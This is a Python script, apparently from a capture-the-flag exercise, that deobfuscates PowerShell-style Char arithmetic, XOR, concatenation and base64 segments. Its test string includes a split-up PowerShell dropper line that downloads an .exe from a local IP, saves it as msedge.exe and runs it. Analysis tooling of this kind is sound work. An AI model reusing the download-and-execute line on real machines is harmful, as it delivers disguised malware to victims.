import re
import base64
from urllib.parse import unquote

chrregex = re.compile(r'Chr\(([-]?\d+)(\s+(\^|\+|\-|\/|\*|\%)\s+(\d+))*\)', re.IGNORECASE)
stringregex = re.compile(r'(".*?"|\'.*?.\')')

concatregex = re.compile(r'({chr}|{string})(\s*\+\s*({chr}|{string}))*'.format(chr=chrregex.pattern, string=stringregex.pattern))

def remove_spaces_bracket(match):
    return f"[Char]({match.group(1)}{match.group(2)}{match.group(3)})"

def char_intended(code):
    code = re.compile(r'\[Char\]\s+\(([-\d\+\*/\^]+)\)', re.IGNORECASE).sub(r'[Char](\1)', code)
    resultnumber = re.compile(r'\[Char\]\s+(\d+)', re.IGNORECASE).sub(r'[Char]\1', code)
    resultexpr = re.compile(r'\[Char\]\s*\(\s*(-?\d+)\s*([+\-*/])\s*(-?\d+)\s*\)', re.IGNORECASE).sub(remove_spaces_bracket, resultnumber)
    resultbxor = re.compile(r'\s*(-?\d+)\s*-\s*bxor\s*(-?\d+)\s*', re.IGNORECASE).sub(r'\1 -bxor \2', resultexpr)
    resultplus = re.compile(r'(\[Char\]\(\d+[+\-*/]\d+\))\s*\+\s*', re.IGNORECASE).sub(r'\1 + ', resultbxor)
    final_result = re.compile(r'(\[Char\]\([^\)]+\))\s*\+\s*(\[Char\]\([^\)]+\))', re.IGNORECASE).sub(r'\1 + \2', resultplus)
    return final_result

def replace_match(match):
    res = match.group(1)
    matchsymbol = re.sub(r'(?<=\d)([\+\*/\^])(?=\d)', r' \1 ', res)
    minussymbol = re.sub(r'(?<=\d)-(?=\d)', r' - ', matchsymbol)
    changebxor = minussymbol.replace('-bxor', '^')
    final_result = re.sub(r'^\((.*)\)$', r'\1', changebxor)
    return f'Chr({final_result})'

def char_transform(code):
    return re.compile(r'\[char\]\(([-\d\+\*/\^\s]+(?:\s?-bxor\s?[-\d\+\*/\^\s]+)?)\)|\[Char\]([-0-9]+)', re.IGNORECASE).sub(replace_match, code)

 
def decode_chr(expr):
    numbers = list(map(int, re.findall(r'-?\d+', expr)))
    simbol = re.compile(r'[-]?\d+\s*(\^|\+|\-|\/|\*|\%|\^)', re.IGNORECASE).findall(expr)
    result = numbers[0]
    for i in range(len(simbol)):
        if simbol[i] == '+':
            result += numbers[i+1]
        elif simbol[i] == '-':
            result -= numbers[i+1]
        elif simbol[i] == '*':
            result *= numbers[i+1]
        elif simbol[i] == '/':
            result //= numbers[i+1]
        elif simbol[i] == '%':
            result %= numbers[i+1]
        elif simbol[i] == '^':
            result ^= numbers[i+1]
    return chr(result)

def validate_input(input_string):
    input_string = input_string.strip()
    while re.search(r'(\w)\s*\+\s*(\w)', input_string):
        input_string = re.sub(r'(\w)\s*\+\s*(\w)', r'\1\2', input_string)
    input_string = re.sub(r'\s*\+\s*', '', input_string)
    return input_string

def check_concat_plus(symbol):
    chr_pattern = re.compile(r'chr\([^()]*\)', re.IGNORECASE)
    chr_substrings = chr_pattern.findall(symbol)
    temp_string = chr_pattern.sub("temp", symbol)
    
    temp_string = validate_input(temp_string)
    
    for chr_substring in chr_substrings:
        temp_string = temp_string.replace("temp", chr_substring, 1)
    return ' ' + temp_string


def concat_code(code):
    concatregex = re.compile(r'(Chr\([^()]*\)|".*?")(\s*\+\s*(Chr\([^()]*\)|".*?"))*', re.IGNORECASE)
    
    matches = concatregex.finditer(code)
    results = []
    for match in matches:
        results.append(match.group(1))
        remaining_text = match.group(0)[len(match.group(1)):].strip()
        while remaining_text:
            next_match = re.match(r'\s*\+\s*(Chr\([^()]*\)|".*?")', remaining_text, re.IGNORECASE)
            if next_match:
                results.append(next_match.group(1))
                remaining_text = remaining_text[next_match.end():].strip()
            else:
                break
    gabungin = [decode_chr(result) if result.startswith('Chr') else result.strip('"') for result in results]
    splitslashn = [splitslash for splitslash in code.strip().splitlines()]
    check = []
    for i in splitslashn:
        check.append(i + '\n')
    newcoderes = []
    for i in range(len(check)):
        check[i] = check[i].replace('"', "").replace("'", "")
        if "+=" in check[i]:
            parts = [part.lstrip(' ') for part in check[i].split('+=')]
            if "+" in parts[1] and not re.search(r'\$\w+', parts[1]):
                newparts = check_concat_plus(parts[1])
            else:
                newparts = parts[1]
            check[i] = parts[0] + "+=" + ' ' + newparts + "\n"
            newcoderes.append(check[i])
        elif "=" in check[i]:
            valid = 0
            parts = [part.lstrip(' ') for part in check[i].split('=')]  
            for j in range(len(parts)):
                if "+" in parts[j] and re.search(r'\$\w+', parts[j]):
                    newcoderes.append(check[i])
                    valid = 1
                    break
            if valid == 0:
                pluscount = 0
                res = ''
                for i in range(len(parts)):
                    if '+' in parts[i]:
                        newparts = check_concat_plus(parts[i])
                        pluscount = 1
                    else:
                        newparts = parts[i]
                    if pluscount == 0 and i == len(parts) - 1:
                        res += ' '
                    if i == len(parts) - 1:
                        res += newparts + '\n'
                    else:
                        res += newparts + '='
                newcoderes.append(res)
        else:
            newcoderes.append(check[i])
    newcode = ''.join([i for i in newcoderes])
    for i, element in enumerate(gabungin):
        if len(element) == 1:
            newcode = newcode.replace(results[i], element)
    return newcode.replace("(", "").replace(")", "")


def Replace(code):
    pattern = re.compile(r'Replace(\w+),([!@#$%^&*\w]+)', re.IGNORECASE)
    def replacer(match):
        return match.group(2)
    newcode = pattern.sub(replacer, code)
    splitslashn = [splitslash for splitslash in newcode.strip().splitlines()]
    newcoderes = []
    for i in range(len(splitslashn)):
        if "+=" in splitslashn[i]:
            newcoderes.append(re.sub(r'(\w)\+=\s*(\w)', r'\1 += \2', splitslashn[i]).strip())
        elif "=" in splitslashn[i]:
            newcoderes.append(re.sub(r'(?<!\s)=(?!\s)', ' = ', splitslashn[i]).strip())
    newcode = ''.join([i + '\n' for i in newcoderes])
    return newcode.strip()


def decoding(code):
    match = re.search(r'(?i)B64_decode_([A-Za-z0-9%_=]+)', code)
    if match:
        try:
            encoded = unquote(match.group(1))
            decoded = base64.b64decode(encoded).decode()
            code = code.replace(match.group(0), decoded)
        except:
            return code
    return code

def semicolon_case(code):
    assign_pattern = r'(\$\w+|\b\w+)\s*=\s*([^;]+)'
    append_pattern = r'(\$\w+|\b\w+)\s*\+=\s*([^;]+)'

    value_dict = {}

    for line in code.split(';'):
        line = line.strip()
        if not line:
            continue

        assign_match = re.match(assign_pattern, line)
        append_match = re.match(append_pattern, line)

        if assign_match:
            var, value = assign_match.groups()
            value = value.replace('+', '')
            value_dict[var] = value
        elif append_match:
            var, value = append_match.groups()
            value = value.replace('+', '')
            if var in value_dict:
                value_dict[var] += value
            else:
                value_dict[var] = value

    for var in value_dict:
        resolved_value = ''
        for token in re.split(r'(\$?\w+)', value_dict[var]):
            if token in value_dict:
                resolved_value += value_dict[token]
            else:
                resolved_value += token
        value_dict[var] = resolved_value

    result_code = []
    for var, value in value_dict.items():
        result_code.append(f"{var} = {value}")

    non_matched_lines = [line for line in code.split(';') if not re.match(assign_pattern, line) and not re.match(append_pattern, line)]
    result_code.extend(non_matched_lines)

    final_result = ';'.join(result_code)
    return final_result

def replace_multiple_variables_and_extra_concat(code):
    append_pattern = r'(\$\w+)\s*\+=\s*(.+)'
    
    value_dict = {}
    for line in code.splitlines():
        if "+=" in line:
            append_match = re.match(append_pattern, line)
            if append_match:
                var, value = append_match.groups()
                value_dict[var] = value_dict.get(var, "") + value.strip()
        else:
            assignments = line.split('=')
            for i in range(len(assignments)-1, 0, -1):
                var = assignments[i-1].strip().split()[-1]
                value = assignments[i].strip().split('=')[0].strip()
                value_dict[var] = value

    for var, value in list(value_dict.items()):
        chain = []
        while value in value_dict and value not in chain:
            chain.append(value)
            value = value_dict[value]
        for v in chain:
            value_dict[v] = value
        value_dict[var] = value

    for var, value in value_dict.items():
        concat = ""
        for token in re.split(r'(\$?\w+)', value):
            if token in value_dict:
                concat += value_dict[token]
            else:
                concat += token
        value_dict[var] = concat

    reverse_dict = {}
    for var, value in value_dict.items():
        if value in reverse_dict:
            reverse_dict[value].append(var)
        else:
            reverse_dict[value] = [var]

    newcode = []
    for value, vars in reverse_dict.items():
        if len(vars) > 1:
            newcode.append(" = ".join(vars) + f" = {value}")
        else:
            newcode.append(f"{vars[0]} = {value}")

    newcodewithslashn = []
    for i in newcode:
        newcodewithslashn.append(i + '\n')
    newcoderes = []
    for i in newcodewithslashn:
        parts = i.split('=')
        res = ''
        for j in parts:
            if '+' in j:
                check = check_concat_plus(j)
                if parts.index(j) == len(parts) - 1:
                    check += '\n'
            else:
                check = j
            res += check
            if "\n" not in j:
                res += "="
        newcoderes.append(res)
    newcode = ''.join([i for i in newcoderes])
    return newcode


def deobfuscate(code):
    try:
        code = char_intended(code)
        code = char_transform(code)
        code = concat_code(code)
        code = Replace(code)
        checkcode = code.split('\n')
        codetemp = []
        semicolon_sign = []
        for i in range(len(checkcode)):
            checkcode[i] += "\n"
            if ';' in checkcode[i]:
                checkcode[i] = semicolon_case(checkcode[i])
                semicolon_sign.append(i)
            else:
                codetemp.append(checkcode[i])
        codetemp2 = ''.join([i for i in codetemp])
        codetemp2 = replace_multiple_variables_and_extra_concat(codetemp2)
        checkcode2 = codetemp2.split('\n')[:-1]
        j = 0
        for i in range(len(checkcode)):
            if i in semicolon_sign:
                continue
            checkcode2[j] += "\n"
            checkcode[i] = checkcode2[j]
            j += 1
            if j == len(checkcode2):
                checkcode = checkcode[:j+1]
                break
        code = ''.join([i.replace('\n', '') if i == checkcode[-1] else i for i in checkcode])
        code = decoding(code)
    except:
        code = "Something's wrong with the code!"
    return code

testing = """
$tes = [Char]        (70) + [Char](-11   +   100) +               [ChAr](99          -bxor        14) + [CHar](109 -bxor 4) + [ChaR](99 -bxor 13)
$tes2 += [ChaR](98   -  10  - 10 + 1) + [CHAR](109 -bxor   4)
$tes2 = [ChaR](99   -  10  - 10 + 1)         +          [CHAR](109 -bxor   4)
$tes3 = [ChaR](99 -bxor 13)  +  [CHar](109-bxor   4)
$tes4 = '[ChaR](99+               13)   +   [CHar](109 -bxor 4)'
$tes5 = $tessss = ReplAce('hel'+ ([ChaR](99   +  10) +  [Char](-10   +   100))   +"lo",[ChaR](99+               10)   '+'   [CHar](109 -bxor 4))
$u='ht'+'tp://192.168.0.16:8282/B64_deC'+'ode_RkxBR3tEYXl1bV90aGlzX'+'2lzX3NlY3JldF9maWxlfQ%3'+'D%3D/chall_mem_se'+'arch.e'+'xe';$t='Wan'+'iTem'+'p';mkdir -force $env:TMP\..\$t;try{iwr $u -OutFile $d\msedge.exe;& $d\msedge.exe;}catch{}
$tes6 = [ChaR](99   -  10  - 10 + 1)+[CHAR](109 -bxor   4)
$tes7 = [ChaR](99   -  10  - 10 + 1)+[CHAR](109 -bxor   4)
$tesss = pe
$tesss += [ChaR](100   -  10  - 10 + 1) + [CHAR](109 -bxor   4) + $tes7
$tes8 = $tesss + [CHAR](109 -bxor   3)
$s10 = $tesss + [CHAR](109 -bxor   3)
$tes9 = [CHAr](109 + 2) + $tes + [CHAR](109 -bxor   5)
$aa = ayam goreng enak loh
$bb = a + $aa
"""

print(deobfuscate(testing))
